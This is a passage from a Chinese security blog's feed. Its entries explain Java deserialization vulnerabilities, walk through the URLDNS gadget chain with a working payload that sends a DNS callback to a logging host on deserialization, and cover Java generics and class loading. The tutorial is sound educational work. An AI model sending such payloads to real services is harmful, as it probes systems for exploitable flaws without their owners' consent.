    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言:&quot;&gt;&lt;/a&gt;前言:&lt;/h1&gt;&lt;p&gt;在学习JAVA安全的路上有许多不顺利的地方,早早就听闻RMI,JNDI注入。最初我作为一个初学者,以为JNDI注入是不是就是类似sql注</summary>
      
    
    
    
    
    <category term="RMI注入" scheme="https://men9da.cn/tags/RMI%E6%B3%A8%E5%85%A5/"/>
    
    <category term="JNDI注入" scheme="https://men9da.cn/tags/JNDI%E6%B3%A8%E5%85%A5/"/>
    
    <category term="JAVA安全" scheme="https://men9da.cn/tags/JAVA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化入门(URLDNS)</title>
    <link href="https://men9da.cn/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/"/>
    <id>https://men9da.cn/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/</id>
    <published>2022-03-03T09:00:20.000Z</published>
    <updated>2022-03-16T09:13:39.342Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言-反序列化漏洞"><a href="#前言-反序列化漏洞" class="headerlink" title="前言:反序列化漏洞"></a>前言:反序列化漏洞</h1><p>在研究java反序列化漏洞之前大家肯定也对php反序列化漏洞,python反序列化漏洞有一定的了解.为什么反序列化漏洞如此盛行,在多个语言中都存在呢? 在学习java反序列化的时候我抛出了这样一个疑问.虽然本人水平有限并且短时间内难以准确回答这个问题,但是我从php反序列化和java反序列化中找到他们的相同与不同处,可能一定程度上能帮助我理解java反序列化.</p><h1 id="反序列化漏洞的逻辑是什么"><a href="#反序列化漏洞的逻辑是什么" class="headerlink" title="反序列化漏洞的逻辑是什么?"></a>反序列化漏洞的逻辑是什么?</h1><p>反序列化漏洞的触发是一个链型的逻辑,我们把这个链形调用链的开头,中部,结尾划分为以下三个部分</p><p>1.链的开头:在反序列化过程中执行或反序列化后执行的,我们称之为“kick-off” gadget</p><p>2.中部: 各种chain,起到链接1和3的作用</p><p>3.链的结尾:执行的任意代码或者命令的类(达成恶意目的) 我们称之为”sink” gadget</p><p>我们在代码中去寻找1和3,然后再找能让1和3链接起来的逻辑,从而形成一条完整的调用链触发恶意代码</p><h6 id="PHP反序列化链中的kick-off"><a href="#PHP反序列化链中的kick-off" class="headerlink" title="PHP反序列化链中的kick-off"></a>PHP反序列化链中的kick-off</h6><p>php中引入了魔法函数这一概念,对象在一些特殊状态下会触发他们.例如对象被初始化时使用的时候的<strong>__construct</strong>方法,对象在销毁时调用的__destruct方法等,正因为他们存在”在反序列化中执行或反序列化之后执行”的这种特性,比如___construct就会在反序列化后立即执行,所以这些都是php反序列化链中常用的kick-off</p><h1 id="JAVA反序列化中的kick-off"><a href="#JAVA反序列化中的kick-off" class="headerlink" title="JAVA反序列化中的kick-off"></a>JAVA反序列化中的kick-off</h1><p>php中序列化/反序列化一个类只需要调用serialize/unserialize就可以了,而在JAVA中,一个类是否能被序列化,需要看他是否实现了<code>java.io.Serializable</code> 或 <code>java.io.Externalizable</code> 接口。</p><p>在这个里面java为这些支持反序列化的类提供了writeObject/readObject方法,但是如果某个类重写了这些方法,那么java将会使用重写的方法进行调用,而非java默认提供的,这里就是JAVA反序列化中的一个kick-off,当某个类重写的writeObject中存在恶意代码或者存在跳板能形成一条最终触发恶意代码的链的时候,就触发了反序列化漏洞</p><p><strong>举个例子</strong></p><p>现在有一个重写了readObject的类demo_001.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo_001</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行此处代码&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个SerializableTest.java的test类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializableTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line"><span class="comment">//        将对象序列化后的字节写入result.txt</span></span><br><span class="line">        demo_001 demo = <span class="keyword">new</span> demo_001();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;result.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(demo);</span><br><span class="line">        oos.close();</span><br><span class="line"><span class="comment">//      将序列化对象反序列化</span></span><br><span class="line">        FileInputStream file = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(file);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行main函数后输出如下</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220303180248117.png" class title="image-20220303180248117"><p>demo_001重写的readObject被执行</p><p>为什么重写了readObject就会执行重写部分的代码呢?从反序列化处下断点跟进readObject看看他的具体实现流程<img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220303180509536.png" class title="image-20220303180509536"></p><p>可以看到readObject实际是调用了readObject0方法</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220303180621861.png" class title="image-20220303180621861"><p>readObject0按照字节读取,当读取到TC_OBJECT(0X73)的时候便会调用readOrdinaryObject进行处理,</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220303180759614.png" class title="image-20220303180759614"><p>此处的TC_OBJECT为0x73</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220303180843075.png" class title="image-20220303180843075"><p>接着进入readOrdinaryObject方法当中,调用readClassDesc获取类描述符</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316154513028.png" class title="image-20220316154513028"><p>类描述符如下:里面保存了类的各种状态信息</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316154558699.png" class title="image-20220316154558699"><p>继续往下,通过类描述符判断类是否实现了Externalizable接口,如果实现了就调用readExternalData,如果没有就调用readSerialData</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316154640090.png" class title="image-20220316154640090"><p>我们实现了并没有实现Externalizable方法.进入readSerialData中:在2284行soltDesc.hasReadObjectMethod方法来判断是否重写了readObject方法,重写了进入下面的代码块</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316155125426.png" class title="image-20220316155125426"><p>在2294行slotDesc.invokeReadObject执行我们重写的readObject方法,调用readObjectMethod.invoke执行重写的readObject方法</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316160822525.png" class title="image-20220316160822525"><p>弹出计算器</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316160857897.png" class title="image-20220316160857897"><h1 id="一个常见的反序列化实例-URLDNS"><a href="#一个常见的反序列化实例-URLDNS" class="headerlink" title="一个常见的反序列化实例:URLDNS"></a>一个常见的反序列化实例:URLDNS</h1><h6 id="触发点-skin"><a href="#触发点-skin" class="headerlink" title="触发点:skin"></a>触发点:skin</h6><p>URL#equals和URL#hashCode对URL对象进行判断时会触发DNS解析</p><p>例如这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL                  url     &#x3D; new URL(&quot;6acb8c0f.toxiclog.xyz&quot;);</span><br><span class="line">URL                  url2     &#x3D; new URL(&quot;6acb8c0f.toxiclog.xyz&quot;);</span><br><span class="line">url.equals(url2);</span><br><span class="line">url.hashCode();</span><br></pre></td></tr></table></figure><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316162314366.png" class title="image-20220316162314366"><h6 id="入口点-kick-off"><a href="#入口点-kick-off" class="headerlink" title="入口点:kick-off"></a>入口点:kick-off</h6><p>有了触发点(url.hashcode,url.equals()),那么入口点在哪儿呢?</p><p>入口点即重写了readObject的类,在java中有个非常常用的类,java.util.HashMap,让我们来看看HashMap重写的readObject方法</p><p>在HashMap#readObject中有这样一段代码:通过简单的分析不难发现循环HashMap,并分别调用键和值的readObject方法进行反序列化,然后调用putVal将这些键值的信息写入HashMap中的table属性中,在putVal中的第一个参数为key的hash值,调用hash去获取key的哈希值,跟进看一下</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316163926384.png" class title="image-20220316163926384"><p>hash(key),当key不为null的时候就会调用key的hashCode方法,前面我们说了,url.hashCode()会造成DNS解析,那么此时如果这里的key时url对象,那么就会在反序列化一个键为url对象的hashmap的时候触发dns解析</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316164230867.png" class title="image-20220316164230867"><p>找到了这些我们就能写我们的payload了:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">urldns001</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        URL                   url     = <span class="keyword">new</span> URL(<span class="string">&quot;http://67211b8d.toxiclog.xyz&quot;</span>);</span><br><span class="line">        Field f       = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        f.set(url, <span class="number">0x01010101</span>);<span class="comment">//防止在hashMap.put的时候触发dns解析</span></span><br><span class="line">        hashMap.put(url, <span class="number">0</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);<span class="comment">//将其hashcode属性复位为-1确保反序列化时能正常触发urldns</span></span><br><span class="line">        </span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">&quot;urldns.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到我们在开始利用反射获取了URL对象的hashCode属性,然后在调用hashmap.put之前将它的值设置为了0x01010101,在hashmap.put后又将其设置回了-1,这是因为hashmap.put方法中会调用一次hash(key),在还未对hashmap进行序列化前就触发dns解析了,而一旦URL触发dns解析,那么URL中的hashCode成员变量就会不等于-1(缓存机制,告诉java这个url已经解析过了不需要第二次解析),我们反序列化的时候就不会触发dns解析了,所以需要先将hashcode变为-1的,在进行序列化,至于为什么要在put前将他设置为0x010101010,这是因为不想在生成payload的时候触发dns解析,这个步骤对于最终的反序列化能否执行没有直接的关系。</p><img src="/2022/03/03/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8-URLDNS/image-20220316165035393.png" class title="image-20220316165035393">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言-反序列化漏洞&quot;&gt;&lt;a href=&quot;#前言-反序列化漏洞&quot; class=&quot;headerlink&quot; title=&quot;前言:反序列化漏洞&quot;&gt;&lt;/a&gt;前言:反序列化漏洞&lt;/h1&gt;&lt;p&gt;在研究java反序列化漏洞之前大家肯定也对php反序列化漏洞,python反序列化漏</summary>
      
    
    
    
    
    <category term="JAVA安全" scheme="https://men9da.cn/tags/JAVA%E5%AE%89%E5%85%A8/"/>
    
    <category term="JAVA反序列化" scheme="https://men9da.cn/tags/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="URLDNS" scheme="https://men9da.cn/tags/URLDNS/"/>
    
  </entry>
  
  <entry>
    <title>JAVA常用特性详解</title>
    <link href="https://men9da.cn/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/"/>
    <id>https://men9da.cn/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/</id>
    <published>2022-02-22T08:55:23.000Z</published>
    <updated>2022-03-02T09:12:31.316Z</updated>
    
    <content type="html"><![CDATA[<p>作为一个没有进行过JAVA开发的菜鸡,在审计代码的过程中经常会遇到JAVA的一些特性,了解这些特性是必要的.我采用一边学习一边记录的方式,在学习JAVA安全过程中遇到的各种JAVA特性,概念在这里进行统一的学习记录,以方便查看.</p><p>这里我把他们分为两个类型,<strong>需要详细深入分析(以下简称详细)**的和</strong>了解用法原理(以下简称了解)<strong>的,**了解指能让我更好的理解读懂代码</strong>,<strong>详细指对漏洞触发,漏洞原理有直接影响的的核心特性.</strong></p><p><strong>目录:</strong></p><p>[TOC]</p><h1 id="泛型-了解"><a href="#泛型-了解" class="headerlink" title="泛型(了解)"></a>泛型(了解)</h1><p>泛型,顾名思义<strong>广泛的数据类型</strong>,如何让一个变量成为任意的数据类型呢?答:让他成为泛型</p><p>例子:在JAVA中List就是一个泛型,我们可以往里面存各种数据,string,int,float,object都可以</p><p><strong>可能出现的疑问(会在最后解答)</strong>:为什么List是一个泛型?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">List demo = <span class="keyword">new</span> ArrayList();</span><br><span class="line">demo.add(<span class="number">123</span>);<span class="comment">//Integer</span></span><br><span class="line">demo.add(<span class="string">&quot;123&quot;</span>);<span class="comment">//String</span></span><br><span class="line">System.out.println(demo.get(<span class="number">0</span>));</span><br><span class="line">System.out.println(demo.get(<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p>demo这个list中存放了两个数据,Integer,String并且我也可以将他们输出出来</p><p>现在我们假设这样一个上下文环境,要求这个demo必须是Integer类型的数据,但是通过我们口头约定肯定是不靠谱的,因为demo是一个泛型,能放入任何类型的数据,假如你手瓢了,写了个demo.add(‘haha’),那么就会出现意想不到的问题</p><p>为了防止这种问题的出现,我们需要定义这个demo的类型,如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">List demo&lt;Integer&gt; &#x3D; new ArrayList();</span><br></pre></td></tr></table></figure><p>这个时候就只能将Integer类型的数据放入demo了,值得注意的是泛型并不会在运行的时候去解析他,因为这个&lt;Integer&gt;只是一个标识符,在编译过程中编译器便会对其进行检查</p><p>指定泛型后idea也给我们标红</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220222181321519.png" class title="image-20220222181321519"><p>所以泛型就是一个可以放入任何数据类型的对象,而我们可以用&lt;&gt;标识去定义它的数据类型</p><p>同样的泛型类,泛型接口原理都是一样的.下面就是一个泛型类,在类后面加上&lt;T&gt;**(这个T的意思只是一个占位符而已,他就是类似函数中的形参)**告诉这是一个泛型类,我们可以把T理解为函数中的形参,我们在实例化这个类的时候需要将数据类型当作实参传入,用来指定key的数据类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Generic&lt;T&gt; &#123; &#x2F;&#x2F;在类名后增加&lt;T&gt;使其成为泛型类,同样的可以使用&lt;T,E,B,...&gt;定义多个泛型形参</span><br><span class="line">    public T data;</span><br><span class="line">    public void setData(T data)&#123;</span><br><span class="line">        this.data &#x3D; data;</span><br><span class="line">    &#125;</span><br><span class="line">    public T getData()&#123;</span><br><span class="line">        return this.data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Generic demo &#x3D; new Generic&lt;Integer&gt;(6666);&#x2F;&#x2F;实例化这个泛型类,定义T为Integer</span><br><span class="line">System.out.println(demo.getData());</span><br><span class="line">&#x2F;&#x2F;输出:6666</span><br></pre></td></tr></table></figure><p>泛型接口同理不再赘述</p><p><strong>问题解答</strong>:到这里你其实应该知道刚刚产生的疑问了,因为List就是一个泛型接口</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220222184000283.png" class title="image-20220222184000283"><h1 id="JAVA类加载机制-详细"><a href="#JAVA类加载机制-详细" class="headerlink" title="JAVA类加载机制(详细)"></a>JAVA类加载机制(详细)</h1><p>JAVA类加载机制非常多的详解文章,个人认为冗余较多,类加载机制又是极其重要的,所以我尝试精简但又不失详细的分析记录.</p><h2 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h2><p>运行java程序时我们写的XXX.java文件被javac编译成XXX.class字节码文件,字节码文件是给JVM虚拟机执行的.但是我们不可能在运行初期就把所有的字节码文件全部读入JVM(因为一个java程序会有很多的.java文件),那样无疑会带来巨量的消耗.JVM通过类加载机制,在需要用到某个类的时候在去加载他,以提高程序执行效率</p><h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><p>一张很经典的图说明了加载一个类所经历的过程</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226140549709.png" class title="image-20220226140549709"><p>.java经过javac编译为字节码文件(.class),如果这个时候这个class需要被使用,那么我们就触发加载流程开始加载这个类</p><p><strong>加载</strong>:其实就是读取.class文件到JVM中,然后将其转为静态数据结构存放在方法区中,然后在堆中生成一个java.lang.class类型的对象.静态数据结构很唬人,其实就理解为将class文件的元数据(类名称,方法名,….各种数据存起来而已)</p><p>**验证:**这个时期会验证class文件格式,元数据是否合法,字节码是否合法,符号引用是否可发,反正就是一些列验证,就是写出来看一眼就忘了,没必要浪费篇幅.</p><p>**准备:**主要工作就是分配内存,初始化类变量(static),不会初始化实例变量.这一过程中并不会执行显示赋值,而是会隐式给予他们默认值(如0,null),在初始化阶段在执行显示赋值</p><p>**解析:**将符号引用转为直接引用,意思就是将符号替换为符号所代表的真实地址,不了解符号引用的同学自行百度了解</p><p><strong>初始化</strong>:这个时候就会完成刚刚没有完成的赋值操作,如将类中的变量显示赋值.</p><p><strong>在以下情况会触发类的加载:</strong></p><p>(1）创建类的实例，也就是new一个对象</p><p>(2）访问某个类或接口的静态变量，或者对该静态变量赋值</p><p>(3）调用类的静态方法</p><p>(4）反射（Class.forName(“com.mengda.test”)）</p><p>(5）初始化一个类的子类（会首先初始化子类的父类）</p><p>(6）JVM启动时标明的启动类，即文件名和类名相同的那个类 只有这6中情况才触发类加载.</p><h2 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h2><p>既然需要动态的去加载我们需要的类(.class字节码文件),那么肯定需要一个加载器来加载他(类加载器),JAVA自带的加载器有三个</p><p>1.Bootstrap CLassloder:</p><p>启动项加载器,用于加载JVM自身需要的类类库及一些核心类库,需要注意的是这个加载器是由C++实现的,不存在于JAVA代码中</p><p>2.Extention ClassLoader:</p><p> 扩展的类加载器，加载目录%JRE_HOME%\lib\ext目录下的jar包和class文件。</p><p>3.AppClassLoader:</p><p>Appclass Loader也称为SystemAppClass 加载当前应用的classpath的所有类。</p><h2 id="双亲委派-类加载器的加载顺序"><a href="#双亲委派-类加载器的加载顺序" class="headerlink" title="双亲委派,类加载器的加载顺序"></a>双亲委派,类加载器的加载顺序</h2><p>加载器的加载顺序实际上是Bootstrap CLassloder-&gt;Extention ClassLoader-&gt;AppClassLoader</p><p>为什么是这个顺序呢?实际上除了Bootstrap CLassloder加载器之外的加载器都有父加载器,而这些加载器都是很懒惰的,每次需要加载一个类的时候都会让他们的爸爸去加载,如果他们的爸爸不能加载才会自己加载,如果他们的爸爸还有爸爸那就会继续给他们爸爸的爸爸进行加载,总之整个类加载顺序无论如何就是从最顶层开始往下执行的(双亲委派)</p><p>看这样一段代码</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226144312969.png" class title="image-20220226144312969"><p><strong>输出</strong>:sun.misc.Launcher$AppClassLoader@b4aac2</p><p>很明显这个test类是由AppClassLoader加载而来的</p><p>那么AppClassLoader的父亲是谁呢?</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226144501446.png" class title="image-20220226144501446"><p><strong>输出</strong>:sun.misc.Launcher$ExtClassLoader@16d3586</p><p>输出是ExtClassLoader,可见ExtClassLoader是AppClassLoader的父亲</p><p>那么ExtClassLoader的父亲是谁呢?</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226144622510.png" class title="image-20220226144622510"><p><strong>输出:null</strong></p><p>why?不是说除了Bootstrap CLassloder之外的加载器都有父亲吗,那为什么ExtClassLoader的父亲是null呢?</p><p>这里就要引出此处的”父亲”并不是指的继承关系上的父亲</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226153944857.png" class title="image-20220226153944857"><p>getParent方法直接就返回了parent,那么这个parent是哪儿来的呢</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226154028834.png" class title="image-20220226154028834"><p>是直接赋值的ClassLoader Parent,是一个类,也就是说这里的父子关系不是继承意义上的父子关系,而是逻辑上的</p><p>为什么为null呢?是因为ExtClassLoader的父亲是Bootstrap CLassloder,而<strong>Bootstrap CLassloder</strong>是C++开发的,并不存在于java代码中,固然为null了</p><p>所以这三个加载器由上至下的关系为</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226154547713.png" class title="image-20220226154547713"><p>由双亲委派机制可以知道他们的执行顺序是由上至下,及Bootstrap CLassloder-&gt;Extention ClassLoader-&gt;AppClassLoader</p><h2 id="双亲委派流程分析"><a href="#双亲委派流程分析" class="headerlink" title="双亲委派流程分析"></a>双亲委派流程分析</h2><p>写了一段示例代码帮助我们分析</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226160924618.png" class title="image-20220226160924618"><p>让我们来看看java是如何实例化一个类的</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226161037400.png" class title="image-20220226161037400"><p>首先来到loadclass方法,首先判断需要加载的类名是否还存在层级,此处的var.lastIndexof(46),46是.的ascall码,用来判断加载的类是否是xx.xxx的形式,如果不是直接进入第二个if,第二个if主要是判断if是否存在(猜测),但是这个if也不会进入,直接会进入super.loadClass.</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226162303303.png" class title="image-20220226162303303"><p>来到了java.lang.ClassLoader的loadClass方法,首先会调用findLoadedClass判断test是否被加载器加载过了,此时类加载器是AppClassLoader</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226162431153.png" class title="image-20220226162431153"><p>那么test此时肯定是没有被加载过的,此时c=null,404行判断parent是否为空(<strong>双亲委派机制触发核心,寻找AppClassLoader的父亲是否存在,存在就让父亲加载</strong>),此时很明显AppClassLoader的父亲是存在的,为ExtClassLoader</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226162702394.png" class title="image-20220226162702394"><p>405行调用ExtClassLoader后依然来到了java.lang.ClassLoader的loadClass方法,和刚刚是同一个方法,因为AppClassLoader和ExtClassLoader都是继承自</p><p>URLClassLoader的,注意,这里说的继承关系是真正的类继承关系,URLClassLoader是AppClassLoader和ExtClassLoader的父类,但是AppClassLoader和ExtClassLoader还存在一层逻辑父子关系,在逻辑上Ext是App的父亲.此时this已经变为ExtClassLoader</p><img src="/2022/02/22/JAVA%E5%B8%B8%E7%94%A8%E7%89%B9%E6%80%A7%E8%AF%A6%E8%A7%A3%E8%AE%B0%E5%BD%95/image-20220226163009769.png" class title="image-20220226163009769"><p>但是ExtClassLoader此处的父亲为null,无法找到父亲了,直接调用407处的findBootStrapClassOrNull,传递到最终的类加载器Bootstrap CLassloder进行加载</p><p>又因为test类是属于AppClassLoader范畴的,在经过BootStrap和ExtClassLoader后发现都不是他们能加载的(ExtClassLoader的findclass方法无法找到对应类),于是就又回到了AppClassLoader,调用AppClassLoader的findClass方法寻找对应类,然后AppClassLoader来加载test类</p><img 